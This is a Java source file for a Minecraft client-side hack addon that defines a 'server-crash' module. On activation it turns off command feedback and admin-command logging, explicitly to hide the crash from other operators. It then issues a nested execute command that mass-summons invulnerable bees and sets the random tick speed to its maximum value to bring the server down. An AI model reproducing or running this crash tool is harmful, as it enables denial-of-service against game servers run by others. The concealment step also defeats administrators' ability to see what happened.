package spigey.asteroide.modules;

import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import spigey.asteroide.AsteroideAddon;

import static spigey.asteroide.util.*;

public class ServerCrashModule extends Module {

    private final SettingGroup sgGeneral = settings.getDefaultGroup();

    private final Setting<Boolean> cmdfeedback = sgGeneral.add(new BoolSetting.Builder()
        .name("No Command feedback")
        .description("Does not spam the chat when enabled")
        .defaultValue(true)
        .build()
    );
    private final Setting<Boolean> logadmin = sgGeneral.add(new BoolSetting.Builder()
        .name("No Log admin commands")
        .description("Hides the server crash to other players with OP")
        .defaultValue(true)
        .build()
    );
    public ServerCrashModule() {
        super(AsteroideAddon.CATEGORY, "server-crash", "[REQUIRES OP] Crashes the server. Bee NoRender and EntityCulling mod highly recommended!");
    }
    @Override
    public void onActivate(){
        banstuff();
        assert mc.player != null;
        error("Remember to disable Bee rendering using NoRender and install the EntityCulling mod!");
        info("Attempting to crash the Server");
        if(!mc.player.hasPermissionLevel(2)){error(perm(2));}
        if(cmdfeedback.get()){msg("/gamerule sendCommandFeedback false");}
        if(logadmin.get()){msg("/gamerule logAdminCommands false");}
        msg("/execute as @e as @e run summon bee ~ ~-10 ~ {Invulnerable:1}");
        msg("/gamerule randomTickSpeed 2147483647");
        toggle();
    }
}

